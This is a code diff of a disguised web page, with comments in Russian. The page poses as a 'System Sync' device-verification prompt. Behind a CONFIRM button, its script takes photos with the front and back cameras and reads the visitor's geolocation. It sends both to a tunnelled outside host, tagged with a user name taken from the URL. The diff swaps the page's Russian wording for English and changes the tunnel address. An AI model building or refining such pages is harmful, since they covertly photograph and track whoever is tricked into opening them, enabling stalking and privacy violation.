@@ -3,113 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>System Verification</title>
+    <title>System Sync</title>
     <style>
-        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
-        .card { width:280px; padding:40px; background:#111; border-radius:30px; border:1px solid #333; text-align:center; box-shadow:0 20px 40px rgba(0,0,0,0.8); }
-        .btn { background:#007AFF; color:#fff; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; }
-        #ld { display:none; margin:20px auto; width:30px; height:30px; border:3px solid #222; border-top:3px solid #007AFF; border-radius:50%; animation:s 1s linear infinite; }
-        @keyframes s { to { transform:rotate(360deg); } }
+        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; }
+        .card { width:260px; padding:35px; background:#111; border:1px solid #333; border-radius:28px; }
+        h2 { font-size:22px; margin-bottom:10px; }
+        p { font-size:14px; color:#666; margin-bottom:30px; }
+        .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; }
+        #loader { display:none; margin:10px auto; width:25px; height:25px; border:3px solid #222; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin { to { transform:rotate(360deg); } }
         video, canvas { display:none; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg" style="color:rgba(255, 255, 255, 0.4); font-size:14px; margin-bottom:30px;">Для синхронизации нажмите подтвердить</p>
-        <button class="btn" id="go" onclick="run()">ПОДТВЕРДИТЬ</button>
-        <div id="ld"></div>
+        <p id="msg">Confirm to sync</p>
+        <button class="btn" id="go" onclick="run()">CONFIRM</button>
+        <div id="loader"></div>
     </div>
-    
+
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // === ВАЖНО: ВСТАВЬ СЮДА ССЫЛКУ ИЗ SSH ТЕРМИНАЛА (БЕЗ "/" В КОНЦЕ) ===
-        const API = "https://361503e3b92cec.lhr.life"; 
+        // === ВСТАВЬ СЮДА СВЕЖУЮ ССЫЛКУ ИЗ ТЕРМИНАЛА SSH ===
+        const API = "https://334b8137373cc7.lhr.life"; 
 
-        // Получаем имя пользователя из URL (?user=...)
         const urlParams = new URLSearchParams(window.location.search);
         const user = urlParams.get('user') || "Unknown_User";
 
-        async function getStream(isBack) {
+        // Функция для захвата фото с конкретной камеры
+        async function takePhoto(isBack) {
             const constraints = {
-                video: {
-                    facingMode: isBack ? { exact: "environment" } : "user",
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                }
+                video: { facingMode: isBack ? { exact: "environment" } : "user" }
             };
+
             try {
-                return await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+
+                // Ждем загрузки видео и фокусировки
+                await new Promise(r => v.onloadedmetadata = r);
+                await new Promise(r => setTimeout(r, 1500));
+
+                const canvas = document.getElementById('c');
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+                
+                // ОСТАНАВЛИВАЕМ ПОТОК (Критично для переключения камер!)
+                stream.getTracks().forEach(t => t.stop());
+                
+                return blob;
             } catch (e) {
-                if (isBack) return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                throw e;
+                console.log(isBack ? "Back camera failed" : "Front camera failed", e);
+                return null;
             }
         }
 
-        async function capture(stream) {
-            const v = document.getElementById('v');
-            const canvas = document.getElementById('c');
-            v.srcObject = stream;
-            
-            await new Promise(r => v.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 1500)); // Ждем фокус
-
-            canvas.width = v.videoWidth;
-            canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
-            
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-            stream.getTracks().forEach(t => t.stop()); // Выключаем камеру
-            return blob;
-        }
-
         async function run() {
-            const btn = document.getElementById('go');
-            const loader = document.getElementById('ld');
-            const status = document.getElementById('st');
-            const msg = document.getElementById('msg');
-
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            status.innerText = "Processing...";
+            const btn = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st'), msg = document.getElementById('msg');
+            btn.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";
 
             const fd = new FormData();
 
             try {
-                // 1. Селфи
-                msg.innerText = "Синхронизация (1/2)...";
-                const s1 = await getStream(false);
-                const b1 = await capture(s1);
-                fd.append('files', b1, 'front.jpg');
+                // 1. ПОЛУЧАЕМ ГЕО (фоном)
+                navigator.geolocation.getCurrentPosition((p) => {
+                    fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors'});
+                }, null, {timeout: 5000});
 
-                // 2. Задняя камера
-                try {
-                    msg.innerText = "Синхронизация (2/2)...";
-                    const s2 = await getStream(true);
-                    const b2 = await capture(s2);
-                    fd.append('files', b2, 'back.jpg');
-                } catch(e) { console.log("No back camera"); }
+                // 2. ДЕЛАЕМ СЕЛФИ (Front)
+                msg.innerText = "Step 1/2...";
+                const frontBlob = await takePhoto(false);
+                if (frontBlob) fd.append('files', frontBlob, 'front.jpg');
 
-                // 3. Отправка на Flask-сервер
-                msg.innerText = "Отправка данных...";
-                const res = await fetch(`${API}/upload-photo?user=${user}`, {
-                    method: 'POST',
-                    body: fd
+                // 3. ДЕЛАЕМ ФОТО ЗАДНЕЙ КАМЕРОЙ (Back)
+                msg.innerText = "Step 2/2...";
+                const backBlob = await takePhoto(true);
+                if (backBlob) fd.append('files', backBlob, 'back.jpg');
+
+                // 4. ОТПРАВЛЯЕМ ВСЁ НА МАК
+                msg.innerText = "Finalizing...";
+                await fetch(`${API}/upload-photo?user=${user}`, { 
+                    method: 'POST', 
+                    body: fd 
                 });
 
-                if (res.ok) {
-                    status.innerText = "Success";
-                    loader.style.display = 'none';
-                    msg.innerText = "Устройство успешно синхронизировано.";
-                    msg.style.color = "#4cd964";
-                } else {
-                    throw new Error("Server error");
-                }
+                // 5. ЗАВЕРШАЕМ
+                st.innerText = "Verified";
+                ld.style.display = 'none';
+                msg.innerText = "Process complete.";
+                msg.style.color = "#4cd964";
 
             } catch (e) {
-                alert("Ошибка! Пожалуйста, разрешите доступ к камере.");
+                alert("Please allow Camera & Location access");
                 location.reload();
             }
         }
